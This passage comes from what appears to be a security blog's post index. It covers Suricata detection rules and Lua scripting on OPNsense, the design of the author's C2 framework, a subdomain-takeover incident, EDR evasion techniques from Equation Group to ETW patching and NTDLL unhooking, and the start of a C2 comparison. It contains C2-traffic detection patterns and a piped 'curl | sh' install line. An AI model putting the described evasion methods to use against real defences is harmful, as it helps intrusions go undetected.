the server. The digest field is what will be used for the next rule we will create. These are easy to include in rules, just specify the ja3.hash flag followed by a content flag containing that digest:alert tcp any any -&gt; any any (msg:\"Match JA3 digest\"; ja3.hash; content:\"4287b6079ba0c8f574ae4d871aed15f9\"; sid:10000002;)With this in place, the following alert gets generated:That’s all well and good but if that cert is rotated then this is no longer an effective alert. Have no fear, you can alert on quite a few field and multiple fields at the same time. Take for example the TTL seen in requests. While it is consistently 63, this alone isn’t enough to confidently say that seeing it is an IOC. However, combine this with also filtering on the header length, and now the rule is very scoped down to only the malicious traffic. I can confidently say this because in Wireshark you can add filter flags in the PCAP to narrow down your search, and once you’re finished there you can then translate almost all of those into Suricata flags:alert tcp any any -&gt; any any (msg:\"Match header length and TTL\"; ipv4.hdr; bsize:20; ttl:63; sid:100000003;)Zooming back out, a broader pattern that can be alerted on is how low quality C2 configurations generally check-in at a consistent pace. Compare the two traffic samples below, one a check-in process and the other a request for yahoo.com:You can see that a series of partial handshakes are being performed regularly and no data is being exchanged, i.e. a check-in is occurring where the C2 is queried for any waiting commands. A high jitter and sleep time can help lower this detection confidence but it’s a very telltale sign of malicious traffic. An alert for this process would look like the following, taking advantage of the threshold flag to set a required number of occurrences and track by_src to set which address we are tracking that threshold by:alert tcp any any -&gt; any any (msg: \"Matched TCP flags for CND\"; tcp.flags:AP; threshold: type threshold, track by_src, count 6, seconds 60; sid:100000004;)Hmm this alert is quite noisy but there is a type set already as threshold which means that there can’t be another limiter added. OPNsense again has you covered with the threshold.config file located in /usr/local/etc/suricata. This lets you set additional thresholds for any alert. In the case of the above rule, the added threshold will look like the following:threshold gen_id 1, sig_id 100000004, type limit, track by_src, count 1, seconds 60Now there should only be one alert per tracked source IP every minute. This can be further adjusted as you see fit for your environment and be done for any rule you need. Which brings us to the crux of Suricata. When writing rules, your environments uniqueness is your strength. You may find that the provided rules here are loud and alert on false positives without additional tuning. That’s the great thing though about these rules, the patterns I set here only picked up the traffic I needed it to. This is only the surface of Suricata and OPNsense - we haven’t even touched the Lua scripting engine that can have traffic offloaded to it for further alert and log generation.LuaConfiguring Suricata to support Lua took maybe the longest part of this whole writeup. There’s little documentation I’ve found from people who have added Lua support to OPNsense instances running the Suricata IDS so, through a lot of trial and error, I’ve tried to document the process here as fully as I can. I’ve walked through these steps a number of times on a fresh VM so I feel fairly confident nothing is missing. If you want to skip the manual configuration, I’ve also compiled the below steps into a sh script that can be downloaded from my Git here.Configuring Lua SupportOut of the box, Lua support is not enabled. You can check this by running suricata --build-info | grep LUA and you will get an output like the following (if yours is enabled, congrats!):To enable this, there’s a bunch of requirements that need to be met first. To start, Rust needs to be installed alongside a few other pkg components. To install these requirements run pkg install lua54 autoconf automake libtool pkgconf wget git. Next up is to download Rust. The download is piped right to sh which is always risky so review the URL and script before continuing. curl https://sh.rustup.rs | sh and just use the default options. After Rust is installed, there’s some manual configuration required for adding it to the path. Using vi, edit ~/.cshrc and at the bottom add the following entries:setenv PATH $HOME/.cargo/bin:$PATHsetenv CARGO_HOME $HOME/.cargoThen run source ~/.cshrc after writing the changes to reload the terminal config.Now to update Suricata. Instead of using git to clone the Suricata repo, which downloads the latest dev release, I suggest using wget to download the latest stable release. These can be found by navigating to https://github.com/OISF/suricata/releases. When you find a suitable version, download the tarball with wget by supplying it with the download URL, then untar it. Navigate into the new Suricata directory and run git clone https://github.com/OISF/libhtp to pickup another required library followed by cargo install --force cbindgen for a missing Rust library. Once both requirements are met, run ./autogen.sh.Before running configure and make, there’s some manual linking required. Lua is currently setup in paths that Suricata is not looking in and so won’t find it. Resolving this requires creating a few symlinks:ln -sf /usr/local/include/lua54/lua.h /usr/include/lua.h ln -sf /usr/local/include/lua54/lualib.h /usr/include/lualib.h ln -sf /usr/local/include/lua54/lauxlib.h /usr/include/lauxlib.h ln -sf /usr/local/include/lua54/luaconf.h /usr/include/luaconf.hln -sf /usr/local/include/lua54/ /usr/local/include/lualn -sf /usr/local/lib/liblua-5.4.a /usr/local/lib/liblua54.a ln -sf /usr/local/lib/liblua-5.4.so /usr/local/lib/liblua54.soln -sf /usr/local/libdata/pkgconfig/lua-5.4.pc /usr/local/libdata/pkgconfig/lua.pc WARNINGThe file lauxlib.h is not misspelled and you may have misread it the first time. Trying to look out for all the other people reading things too quickly like myself.We’re getting close to the end, I promise. Two more edits to make sure Lua can be found. Still in your new Suricata directory, run setenv LUA_CFLAGS \"-I/usr/local/include/lua5.4\" and setenv LUA_LIBS \"-L/usr/local/lib -llua-5.4\". These are to set compiler flags in the Makefile. Now it’s finally time to run configure ./configure --enable-lua --with-lua=/usr/local/lib followed by make &amp;&amp; make install-full to complete the setup. Then just restart the service and when suricata --build-info | grep LUA is run again, it shows as enabled. NOTESome of the absolute paths I have used may be different for you. If you use one and find that it results in an error while running make, be sure to re-run configure after each adjustment you do before you try and run make again. Some errors may require you to go back a step further and run ./autogen.sh before configure. When all else fails, start from the top with make clean, followed by ./autogen.sh, configure, and makeIn addition to Lua being enabled, if you run suricata --build-info | grep yes you can see all the enabled components. Among these, JA4 is there.Writing Lua ScriptsSo you’ve got Lua enabled, but what does a Lua script look like? Suricata’s documentation is seriously your biggest asset, use it, love it, cherish it. All scripts require an init function in them which determines which piece of the packet to pull in. For this example, it will be for generating an alert. Alerting has stripped down requirements versus generating a log entry. Note that, depending on what you want to alert on, different packet properties have different needs. For instance, to analyze TLS packets, the init function would look like the following:function init (args) local needs = {} needs[\"tls\"] = tostring(true) return needsendThen, to alert on a self-signed certificate, you would pull out the issuer and subject fields from the certificate and compare them. If it is true that the two fields are the same, the rule has a match and will generate an alert:function match (args) version, subject, issuer, fingerprint = TlsGetCertInfo() if subject == issuer then return 1 end return 0endreturn 0Using this script in a rule is simple, just add lua: script1.lua anywhere you want it to be run. For instance, a simple version would look like this:alert tcp any any -&gt; any any (msg: \"Lua script found a self signed cert\"; flow:established; lua: script1.lua; tls.store; sid:100000007;)The alert looks for an established flow, which just means that the connection is fully established, and on a match the tls.store keyword indicates that the cert is stored to the disk. This allows further analysis with JA3/4. When this alert is triggered, it looks like the below:There’s more than just alerting however, there’s also the option to generate robust log information. By changing the init function from needs[\"tls\"] = tostring(true) to needs[\"protocol\"] = \"tls\" and the match function to log, you can now generate log messages for certain traffic patterns. The log scripts are more involved than match scripts as they also require additional setup functions and deinit functions, but it’s not a big jump in difficulty. These will be explored more in later posts.Wrapping UpAnd that’s it! I would say more than half the guide is dedicated to the proper configuration, but having that correct means way less headaches down the line. I’d add more to the Lua and Suricata sections but this post is very long as is. Best to save that for a future post instead.My goal with writing this was to help create a baseline with where to start with OPNsense and lay out some paths to progress with to expand what you’ve created here. You should have a set of interfaces, subnets, and three firewalls to fiddle with in addition to the Suricata and Lua rules.If you’re undecided about next steps, one would be to play with the drop function for alerts. After all, if traffic patterns match your rules for malware, why should they be allowed to keep flowing freely? This will be a real test of your rule writing as you don’t want to inadvertently affect normal traffic flows. Additionally, as I mentioned JA4 support is enabled now for your rule engine, so check out the expanded fields offered.While this guide focused almost solely on Suricata, there’s a lot more to OPNsense than just this. Other aspects you can consider are setting up the VPN service. There is a WireGuard VPN built into it and, for those uninitiated, WireGuard has quickly become one of the dominant forces in the VPN industry for good reason. It’s fast, lightweight, and works on about any platform. Or if you want instead, you can start setting up additional interfaces with VLANs and learn more about VLAN tagging. And all of these services can be filtered through the IDS engine you spent so long setting up." }, { "title": "Making Red Teaming Safer", "url": "/posts/Making-Red-Teaming-Safer/", "categories": "", "tags": "", "date": "2024-02-15 00:00:00 +0000", "snippet": "I have been quietly hard at work the past few months turning an old project that didn’t quite work even half the time into a framework that provides the solid base of functionality required to buil...", "content": "I have been quietly hard at work the past few months turning an old project that didn’t quite work even half the time into a framework that provides the solid base of functionality required to build something much larger off of. But first, some background.Last year, I made a post about designing a red team framework. It was the offshoot of a Vault 7 project I made in Python and the first one I had built from the ground up after testing things like Covenant, Sliver, and Havoc. Compared to those, you’d never have wanted to use mine, turns out building something is harder than critiquing it. Mine was overly complicated, didn’t scale well at all, was hard to understand for anyone looking at the first time, and so on. That’s not even mentioning just piping all commands sent by the operator to the implant through cmd.exe, so there was a lot to improve upon. Over time I just kept writing down ideas that I wanted implemented and things that I was confused about to research further and add in. And over time the project grew from a simple Python script of less than a hundred lines to a few hundred lines of Go, Python, and Bash and then to a pure Go implementation with templating and reusable functions and gRPC servers.Up front, I’m not one of those amazing Windows devs who can whip up spoofed thread call stacks and pretend I have backed memory in my implant (yet!) (especially in Go) but what I do focus on in my day to day is a lot of networking. So this is where I spent my time thinking about the frameworks attack surface. Who can read the communications, who could send unauthorized commands to my implants, could someone MitM me and decrypt comms with sensitive data, could my control server get flooded with fake registry of new implants, and so on, so this is where I spent my time developing. The core functionality of the framework features using public key infrastructure to authenticate all the commands sent to an implant using RSA signatures and authenticating the C2 server on the implant side through TLS fingerprinting.Realistically as well, I didn’t want to spend a lot of time focusing on “hiding” and “evasion” for a tool I was going to release publicly (I know, convenient excuse for me to be bad at it.) That can be saved for private repos where the authors can actually get mileage out of the tools they develop. OSS and evasion don’t generally mix well with one another. I would rather have a robust framework that was error resistant and provided a platform for easy expansion.What did I want to solve?My specific niche I set out to fill was that I thought C2 frameworks on the market were too fast and loose with their default security protections. As security minded people, we always preach security forward approaches to development. But then that kind of just goes out the window when it comes to products that we develop. I wanted to change that with a security forward approach to managing implants and have a framework that tries to be resistant to exploitation itself from probing defenders.For example, I noticed that a lot of frameworks register implants at the point that they check in. This is because you only want to list implants that are active and have executed their main payload. However, a lot of frameworks are vulnerable to a denial of service through the same function. Because they wait for implants to tell the C2 that they are alive, if you flood the server with these notifications it will get overwhelmed. I wanted to avoid this. All the implant registration occurs server side, meaning that the scope of that exploitation is limited to snagging implant commands before they can be executed - but that requires an individual implant ID that should be impossible to guess from implant to implant so any analysis on a compromised device will only result in that ID being burned.Another security forward development approach I took was that commands being executed require a signature of a private key alongside them to verify that they are in fact legitimate. This is to prevent someone taking over the upstream route and trying to issue commands to implants reaching out that would uninstall or otherwise disrupt the operation. On the topic of prevent up stream routes being taken over as well, the framework implements SSL pinning for their self signed certificates. Each generated implant has this fingerprint embedded inside of it and checks when making any communication if the fingerprint lines up. Both of these methods leave observable information in the implant that defenders and investigators can use to further track down domains used, so it’s a trade off of less security in one area and more security in another. This can be minimized to a degree by using different certificates for different listeners and pointing different implants to those, but it won’t be completely hidden. Later, I’ll discuss some other methods employed to try and minimize that observability impact though.Guiding development principlesBefore going further into the features, I wanted to explain some guiding principals I had. When I first started working on what would become Dagger it began with a lot of writing down notes at odd times of the day then getting around to implementing them some time later. These notes after a while became what I called my guidelines. They were non technical ideas that I wanted the project to follow no matter where it went. Cross compilation Golang can target just about any architecture. I wrote this on an Arm Mac, tested it on an Intel Windows VM, and hosted the C2 on an Arm Kali VM. No issues. Secure by design What I mean when I say this is that I want a very secure interaction. No one but me should be sending commands to implants. The commands sent should be encrypted and they should be verified using PKI. Finally, information sent back should be encrypted with the public key and decrypted on the receiving end with the private key in order to stop anyone who did a packet capture and is hoping to sniff information out on the wire. Avoid using the shell Many adversary groups will run whoami when they first get on a box, and it works because they’re not operating in mature environments typically that have logging and sensors on all their end points and servers. However, for the use case I designed this around, that wouldn’t really pass muster. I wanted to demonstrate the issue with focusing in on the command interpreter. So for example with the aforementioned whoami, we can completely avoid creating an event ID by using the Go package os/user and querying the security context of the logged in user. Easy to expand I wanted it to be relatively obvious when looking at the code to see where you can add your own functions. People fork and take over projects all the time so making it maintainable is important. Unit tests and clear coding standards all make that possible. I am by no means an expert in this area and there’s still a long way to go with getting the code base up to par (so many structs that could just be one) but I’m aware of it and continuing to work on it. Overview of features (that I think are cool)APIThe API is designed to abstract away from end users and the controller the ability to directly interact with the DB, and instead we expose a select set of features that have a narrow purpose. Now, instead of having to correctly write and format every insertion into the DB and every request for information out of it, we can send this through our API which checks for errors and retrieves the information in a way that can easily be parsed through.Originally, I stuck to making native calls to Redis through each application individually, relying on myself to make sure that I structured each Get and Set correctly so that the information would be consistent between each service. As the code base grew though, and as I wanted to add in the ability to automate tasks dependent on things like check-in times, it became apparent that this functionality had to be abstracted away from the user. It would not be very development friendly if I left it open ended how to insert information.So I returned to gRPC. This time around, I started with a very narrow implementation. I only wanted to take away having to directly interface with the Redis DB. From there, the scope was expanded to include the builder component and the controller. Instead of the controller relying on passing arguments to the compiled builder, it would be a lot easier to run it as a gRPC server that would intake the different aspects needed to compile the implant.AutomationOn the topic of exposed API functions, Outflank OST is very cool (for a number of other reasons than this one) because it lets you run Jupyter Notebooks as an automation point for your Cobalt Strike beacon. I wanted the same sort of automation with Dagger implants. That was the motivation behind making the API too, as I said before. Implants check in at weird times so requiring an operator be present to issue the initial information gathering is inefficient, and sometimes when you’re available and the implant is will never match up at all. An API and automation scripts resolve a lot of this headache. Each function exposed by the API gRPC server has an associated Golang app in the examples folder which details a basic function to work with it and display data. From here, it’s quite easy to build out a script that checks, for instance, the last time an implant checked in with the server or if it checked in for the first time and give it commands to run and record the output.Customizable implantsImplants will always be the first thing to get burned. Defenders will have access to them, so minimizing the potential for information to be gathered quickly is important. To that end, there’s a lot of useful information in the Dagger implant that a defender would want. We have ungarbled certificates, domain names, public key fingerprints for SSL pinning, the list goes on. There’s a lot of ways that this can be hidden and made to be consistently inconsistent across generated implants. This is also where I found a lot of opportunity to implement evasions that I felt more confident in implementing as opposed to figuring out dynamic module stomping and syscalls without just copying other peoples work - there’s a dearth of information on Golang topics like those mentioned while C, on the other hand, has copious amounts to learn from.String hashingString hashing is a fast and reliable way to obfuscate strings in order to make static analysis harder. For this implementation, using string hashing on the key fingerprint used in SSL pinning allows the implant to avoid having the exact fingerprint and instead only a hash. This has an added bonus of being exponentially faster compute time wise when it comes to doing the actual comparison of fingerprints. With string comparison, the operation works character by character. But with an integer comparison, the whole integer is compared at once. With the implementation in the Dagger implant, we don’t benefit from this time complexity trade off since we still have to hash the incoming signature, but it’s just fun to know how much faster these two comparisons are. This is not a completely fault tolerant system though. This is prone to collisions and that frequency is dependent on the algorithm you choose. In the case of Dagger, the algorithm is just left shifting then adding. It’s nothing complicated and collisions are more likely than something like SHA.Editing the config liveIt sucks when keys and infrastructure gets burned, so I never understood why more frameworks don’t let you edit things like listener addresses, public keys, etc. on the fly. In the Dagger implant, the fingerprint, domains, and server keys are replaceable with whatever data you want. You can completely brick your implant by setting new values for these that don’t exist if you so choose. Setting up a new listener that can accept implants registered to another is tricky unless you make the central Redis DB accessible - it’s up to you to do that properly though.What does the future holdRSA is inherently a poor algorithm choice. While the implementation in Dagger is not terrible, upgrading this to ECDSA is a big priority. Check out the following two links for more on why Seriously, stop using RSA - Trail of Bits Blog Using RSA Securely in 2022 - Dhole MomentsThere are some core areas that Dagger is lacking. Things like support for lateral movement techniques outside of copying the implant to another directory and getting another user to run it. Up to this point, the commands that Dagger supports has been misusing the OS package since so much functionality exists there in a simple form. However for more complicated actions like lateral movement, this will no longer suffice. Anything to do with COM or SMB or general remote management is stepping into the custom library territory.Something I want to get better at is unit testing. I only recently started adding unit tests for new functions and they are magic. In the most basic cases, they make you absolutely sure that your function works properly and returns the data you expect.There are also a number of known bugs identified that need time put towards resolving them. These include: If you look at the compiled implant in a debugger and search for http strings, you’ll quickly find the listener address. This is because there is a non failing error to do with an incorrect header. Trying to fix that but for now it’s a great point for analysts to look at and find C2’s. Upon building your first implant for a platform, you will get an error on the status and control will return to the main function. Then after a moment the UUID will be displayed and a message that it was added to the DB. If you search the UUID, you will find it was properly added with no apparent issues. The fingerprint is hashed on the implant side using a string hashing method that is not second preimage resistant or collision resistant. This could lead to failure to properly verify down the line if someone can generate a hash of another message that equals this hash (H(x1) == H(x2)) I’m unsure if this will be addressed or not. If you try to create a listener, get to the URL handler section, and exit, it will still try to serve on that port causing issues when you attempt to start another listener." }, { "title": "Subdomain Takeovers", "url": "/posts/Subdomain-Takeovers/", "categories": "", "tags": "", "date": "2023-12-08 00:00:00 +0000", "snippet": "A quick story of a misconfigurationThis is a very quick post, I’m working on others I promise. On Dec 8, I went to my site, git.culbertreport.com, and all looked good. I then went to cr.culbertrepo...", "content": "A quick story of a misconfigurationThis is a very quick post, I’m working on others I promise. On Dec 8, I went to my site, git.culbertreport.com, and all looked good. I then went to cr.culbertreport.com to try and fix an issue with that returning a 404 and I found a crypto site.I’m not going to lie, I kinda panicked for a minute. What happened, was my Cloudflare hacked, how I have 2fa, was my Git hacked and also how since I have 2fa there, was my SIM copied, and down the rabbit hole I spiraled for a minute while looking through records. All looked good in Cloudflare.So I had to look elsewhere and remembered that the domain is also configured through GitHub. On GitHub pages, you set a custom domain for fancier domain names than just ‘xxx.github.io’ and mine is currently ‘git.culbertreport.com’But back when this site was hosted through Google, I had used the subdomain ‘cr.’ When I transferred to Cloudflare I had kept it in the hopes of eventually fixing the routing with it and some others but I just never dedicated a lot of time to the issue and honestly didn’t think too much of it since it returned only a 404. This then got me thinking, did someone setup their ‘pages’ setting with ‘cr.culbertreport.com’ taking advantage of my routing?Yep! Sure looks like someone did just that. Let’s take a look at what else this person is doing.That sure is a lot of commits in just a few days, they must be working really hard. This is a classic example of subdomain takeovers. You can read more about it through Mozilla. I got so lucky that this had only been up for a few days and I happened upon it by chance, and this is really a cautionary tale about keeping tidy and up to date DNS records. I reported the user to GitHub, let’s hope the person is taken down quickly." }, { "title": "The Evolution Of Evasion", "url": "/posts/The-evolution-of-evasion/", "categories": "", "tags": "", "date": "2023-08-20 00:00:00 +0000", "snippet": "The evolution of evasionEvasion is a very interesting topic. When I say evasion, I’m referring to both evading prying eyes from analysts and avoiding their attention, as well as evading AV and EDR....", "content": "The evolution of evasionEvasion is a very interesting topic. When I say evasion, I’m referring to both evading prying eyes from analysts and avoiding their attention, as well as evading AV and EDR. We can see how espionage operations in 2000 led to advancements in EDR and OS mitigations today in 2023. The Equation Group is fascinating to study in this area because for so long their operations went unattributed. And this can be directly tied to how well they tailored their target list and worked to keep themselves from being discovered. Thanks to the Shadow Brokers and Kaspersky, we are able to now get a deep insight into their specific methodology and techniques used in one stage of their operational development. Kaspersky also provided a lot of great analysis and documentation in the year leading up to the public release of the toolsets. After analyzing some of Equation Groups leaked tools, I’ll also touch on some modern developments in evasion. The modern land scape is a lot different than even just a couple years ago - go figure.EQUATIONDRUGEQUATIONDRUG is one of the first tools that was developed in the Equation Group arsenal and one of the tools leaked through the Shadow Brokers. It is best described as a post exploitation platform that is loaded onto interesting targets following an initial infection by DOUBLEFANTASY. It was developed, possibly, as far back as 1996. It primarily targeted XP operating systems and GRAYFISH evolved from there to target additional Windows versions. Due to the extensive leaks of certain tools, anyone can examine some of these in Ghidra and PEStudio and gather some fascinating insights on their modus operandi. For example, at the bottom of the picture you can see KeServiceDescriptorTable is imported.Perusing the decompiled source, you can find how this function was utilized.I’ll be upfront that I’m not an expert in analyzing the decompiled and optimized code Ghidra returns from compiled sources, but we can see two clear calls here and correlate them with compiled information from Kaspersky. That is KeServiceDescriptorTable and KeAddSystemServiceTable. The latter of these is for adding new system calls to the SSDT which PeStudio actually missed when pulling strings out. On Vista and above this is no longer possible because there is only room for two; the kernels and win32ks. Equation Group was using these calls in order to add a new subsystem for a harder to detect angle of attack. To a modern audience, this is nothing new. Attackers have been leveraging Windows subsystem for Linux since it came out of testing. But at the time, this was quite novel since it was not a clearly documented Nt function.Going back to Kasperskys research, they identified a key feature in FANNY (discussed here later) was that it was able to replace SSDT entries for functions with their own calls to perform whatever actions they want. The implementation of the exploit in Fanny is more complex than in Stuxnet: instead of running just one payload the authors created a framework to run as many payloads as they want by replacing a system service call dispatcher nt!NtShutdownSystem with their own custom pointer from the user-space as shown in the next figure.It’s not out of the question that a similar functionality was implemented into EQUATIONDRUG based on the below excerpt from an analyzed DLL.We can breakdown the above sample in more manageable chunks. FUN_68003e16 is a function that takes an HMODULE and a char. An HMODULE is the DLLs base address. Looking at the compiled Assembly, the full instruction at this address is LEA EDI,[ESI + 0x18]. LEA is interesting because it does memory calculations to determine an offset and then store it in any register. I want to avoid diving into the weeds of this too much since it will be so easy to get lost in the nuance of what makes LEA special but basically it’s the only Assembly instruction that lets you perform memory addressing calculations without addressing the memory. This is significant because in FUN_68003e16, they call GetProcAddress for this offset and proceed to use the pointer declared to overwrite it from one instruction to another - just as was observed with FANNY.EQUATIONDRUG also had a very unique capability at the time, and that was running before system startup fully completed. This methodology was more realized in the subsequent platform GRAYFISH. This predates EDR running before system startup and takes advantage of there being limited, if any at all, telemetry on what software and drivers are running at this time. The new book Evading EDR, by Matt Hand, has a section on how EDR runs pre boot actions. Chapter 11 Early Launch Antimalware Drivers. Microsoft introduced a new anti-malware feature in Windows 8 that allows certain special drivers to load before all other boot-start drivers. Today, nearly all EDR vendors leveragethis capability, called Early Launch Antimalware (ELAM), in some way, as itoffers the ability to affect the system extremely early in the boot process.It also provides access to specific types of system telemetry not available toother components.Thanks to the Shadow Brokers, we can get a good idea of some of the modules that were loaded as part of the framework. An interesting example is mstcp32.sys. This is for intercepting packets and executing commands based on fields seen. Though it’s for intercepting packets, it acts as a root kit, performing kernel calls on the fly to the registry and staying away from prying eyes. This can be observed in the below in some brief example calls to the registry.DOUBLEFANTASYDOUBLEFANTASY is one of the earliest droppers that Equation Group developed and it was discovered, interestingly enough, on CD’s sent to conference attendees that were at a Houston event. It was deployed as a generic dropper alongside a custom developed AutoRun file that loaded and executed the DLL from disk. Both it and the DLL employed a set of 0days to get root access which leads to the conclusion that they probably were meant to run independently of one another. When ran, a simple XOR decryption was performed and DOUBLEFANTASY checked the registry for installed AV from a pre defined list of vendors. At the time, the method of using key enumeration was “non alarming” as opposed to directly accessing the key. Nowadays we refer to this method as T1012 and there’s many detection patterns built around it. If no known AV was found, the malware persisted and executed further. Otherwise, it cleaned up and no one was the wiser. This was a lot simpler when there was such few AV vendors, and barely any of them were worth their salt at detecting threats. Nowadays, this is far less likely to accurately find AV to avoid and the key enumeration would raise alarms.FANNYThe earliest sample Kaspersky was able to analyze had a compiled time stamp of 2008, two years before the same zero days would be used in Stuxnet, in conjunction with two more, to cripple Irans nuclear efforts. FANNY, due to the nature of the sensitivity of its payload, would naturally want to remain undetected by prying eyes. This means that targeting appropriate systems and individuals is of the utmost importance.FANNY itself is easiest to think of as a persistent loader. Similar to Stuxnet, it uses the LNK exploit to autorun from USB drives even if autorun is disabled. Where they differ is that FANNY had a much broader target OS scope. Once FANNY executes, it fetches a payload from the C2 for further post-exploitation features. But it also has the ability to persist on the USB in order to relay commands back and forth from air gapped machines. This leads us into the first evasion technique that FANNY employs. Each time there is a successful infection, a counter decreases and when that hits 1, execution stops and FANNY stops further infections. This limits the spread and allows the operators to try and keep it contained within the target environment.The next evasion technique is a little counter-intuitive. How might you weed out systems that have AV or other software that can expose your operation? FANNY did this by making it quickly obvious to AV and analysts that it was typical crimeware that should be removed. Any analyst looking at it would just write it off as malware that was cleaned up, maybe reimage the system to be safe, and Equation Group would keep their real tools safe from further scrutiny. And this worked well, really well. For six years it was detected only as part of the zbot malware family until Kaspersky went hunting for the Equation Groups tools based on a library signature. If the module persisted past this point, only then would further payloads be fetched.GRAYFISHGRAYFISH is described by researchers as the Equation Groups most modern and sophisticated malware implant. This can be observed through numerous developments in methodology and tactics, such as leveraging 0days in HDD firmware to persist indefinitely after hard drive wipes , leveraging the registry to store and hide modules, and installing a bootkit to entirely control the start to finish boot process how they like. When the computer starts,GRAYFISH hijacks the OS loading mechanisms by injectingits code into the boot record. This allows it to control the launching of Windowsat each stage. In fact, after infection, the computer is not run by itself more:it isGRAYFISH that runs it step by step, making the necessary changes on the fly.Normally, user space apps are not allowed to execute with ring 0 privileges. GRAYFISH bypassed this by leveraging a vulnerable driver, a technique now known as bring your own vulnerable driver (BYOVD.) This allowed the actors to execute their tools as the highest privilege available. To bypass modern OS security mechanisms that block the execution of untrustedcode in kernel mode, GRAYFISH exploits several legitimate drivers, including onefrom the CloneCD program. This driver (ElbyCDIO.sys) contains a vulnerability whichGRAYFISH exploits to achieve kernel-level code execution. Despite the fact that thevulnerability was discovered in 2009, the digital signature has not yet been revoked.Another uncommon technique, for the time, was to live off of the registry. You can see this technique in MITRE ATT&amp;CK as T1112. The GRAYFISH implementation appears to have been designed to make it invisibleto antivirus products. When used together with the bootkit, all the modules as wellas the stolen data are stored in encrypted form in the registry and dynamicallydecrypted and executed. There are no malicious executable modules at all onthe filesystem of an infected system.Unfortunately, I can’t get any samples of GRAYFISH to look at further myself, so my summary of evasion techniques is limited to what’s publicly already been discussed, and there’s little available in that regard.What’s Happening TodayThat’s a historical look at evasion using Equation Group as an example, but evasion continues to change every day to adapt to new and changing EDR products. Below I have a set of some of my favorite techniques that I think represent a rapid growth in the offsec research environment. I can’t do each of them justice, they all deserve a post dedicated solely to them, but I will try to accurately summarize them for quick reference and provide a project that utilizes them.SyswhispersSysWhispers allows teams to directly reference syscall numbers without having to go through NTDLL for them. Hells Gate is an evolution of this and enumerates the NTDLL table for these numbers. SysWhispers is a header library/asm file combo that you can import into your project that has the correct ID for each call needed. Since you now have the correct ID numbers, you don’t need to import NTDLL to perform your syscalls. There’s been a few evolutions from the original SysWhispers, we now have 2 and 3. Each iteration has added different support and uses different compilers.Sleep obfuscationMDSecs Peter Winter-Smith can be credited with a lot of the work that went into developing sleep obfuscation, though back in 2016 Gargoyle laid much of the ground work. The example that I will use for this is Cronos, which credits Ekko, which in turn credits Peter for their inspiration. At a base level the Cronos function RC4 encrypts the running process then changes its memory from RW to RX. But sleep obfuscation is a lot more complicated than just this. Rewinding back to 2016, when scanners originally caught onto Gargoyle marking sections as non executable, SleepyCrypt came along and performed a single byte XOR to encrypt the malicious section. Now scanners will quickly brute force this which caused researchers to look for new techniques. Foliage was the first to use encryption of the running process and leveraged a ROP chain to achieve execution after sleep. Ekko and Cronos followed suit, iterating on this with Ekko utilizing an RSP register to make the ROP chain much more stable. This is accomplished because the RSP register is your stack pointer. This article by TrustFoundry is very helpful for further understanding this.Spoofing the thread call stackThis is a lot like sleep obfuscation but it has a slightly different end result. You will perform the necessary steps of loading the shellcode, acquire your function pointers, then hook the kernel32!Sleep method to point to our own version. We allocate the memory, copy the shellcode contents into it, and then call CreateThread to begin execution. As soon as the implant finishes its tasks and attempts to sleep, our custom sleep callback is invoked which will copy then overwrite the return address on the stack to 0 - meaning the code goes no where. Then the implant sleeps for the specified period and afterwards restores the copied return address to the stack allowing execution to continue.Reflective DLL loadersReflect DLL injection is a technique to run a DLL entirely in memory. First you calculate the size of the DLL to load, allocate a memory region for it, and copy it into there. But DLLs aren’t designed to run from memory, they’re designed to export functions while on disk. Stephen Fewers example solves this by exporting a primary function that handles this loading through a version of LoadLibrary that can handle being passed memory regions to read from. I’m not doing this justice with my explanation so I encourage anyone unfamiliar with this to play around with the exampel and attempt to get it to execute.Disabling ETWETW stands for event tracing for Windows and provides robust heuristics on running processes and syscalls. This makes it a great tool for EDR to easily monitor processes for suspicious actions. EDR especially likes this because even if their hooks are removed from NTDLL to mask calls that way, the access is still logged through ETW. Bypassing both then becomes a requirement for engagements. Another MDSec researcher (I’m seeing a trend here…) Adam Chester, has a blog post as well that is linked from within the White Knight Labs article. He simply overwrites the start of the function with the return bytes so that when it is called it just runs its clean up routine and exits.Removing hooks from NTDLLThis is definitely the simplest approach to evasion and entails removing EDR hooks placed in loaded copies of NTDLL. When a new process is started, that process needs to determine different syscalls to use. Those memory locations are referenced from NTDLL. EDR knows this and patches the copy loaded so that suspicious calls JMP to the EDR for analysis before returning back to normal process flow if it is determined to be safe.There are a couple of ways to remove these hooks. You can remove on a per call basis so that maybe only CreateRemoteThread will avoid the EDR. Or you can copy the entire .text section of the file and overwrite how it is in the running process. I’ve not linked a project here because there’s a ton of different methods for doing it, all with their own ups and downs." }, { "title": "C2 Smackdown Empire Vs Mythic", "url": "/posts/C2-Smackdown-Empire-vs-Mythic/", "categories": "", "tags": "", "date": "2023-07-20 00:00:00 +0000", "snippet": "C2 Smackdown - Empire vs MythicI found evaluating platforms like this to be a great way to familiarize myself with them quickly, so I’ve opted to do this test again. The last time I compared C2’s, ...", "content": "C2 Smackdown - Empire vs MythicI found evaluating platforms like this to be a great way to familiarize myself with them quickly, so I’ve opted to do this test again. The last time I compared C2’s, it was Havoc vs Sliver, and Sliver came out on top because they simply had more resources that they could dedicate to development and expansion. But Havoc was impressive for what it was, a Cobalt Strike lookalike that was developed by one primary person. It showed a lot of promise and I’m sure the developer will flesh this out into a fantastic platform. However, for this test, Empire and Mythic are both backed by companies with a large staff pool and have resources to spend on development, so it should be a much fairer comparison. There will be four categories that the platforms will be tested on, (1) what’s the GUI like, (2) what options are there for generating implants, (3) how do you interact with agents, and (4) if there is an option for an after engagement summary. These goals are slightly adjusted from the prior test in order to represent what I think are more important features people evaluating which product fits their needs will want to see. For each platform, I’ve established a persistent implant and then run some common tools like SeatBelt and Rubeus to see how easily these are executed. I’ve also taken a look at that backend code that is running so as to point out neat tricks or shortcuts that the development teams have taken, for better or worse.MythicMythic is partially maintained by SpecterOps, a cybersecurity company that is also known for development of BloodHound. A fun detail linking this all neatly together, harmj0y developed both Empire and BloodHound. Mythic states their main goals are a platform that allows plug and play architecture where modifications can happen on the fly and contains robust reporting for breaking down and attributing each command to each operator. They state the following about their logging which sums it up nicely. From the very beginning of creating a payload, Mythic tracks the specific command and control profile parameters used, the commands loaded into the payload and their versions, who created it, when, and why. All of this is used to provide a more coherent operational view when a new callback checks in. Simple questions such as “which payload triggered this callback”, “who issued this task”, and even “why is there a new callback” now all have contextual data to give answers. From here, operators can start automatically tracking their footprints in the network for operational security (OpSec) concerns and to help with deconflictions.Aside from the robust reporting, Mythic also has a lot of nice-to-haves. One of these is a credential vault for storing credentials, keys, and miscellaneous other things that you wouldn’t want to be exposed. The credential vault uses 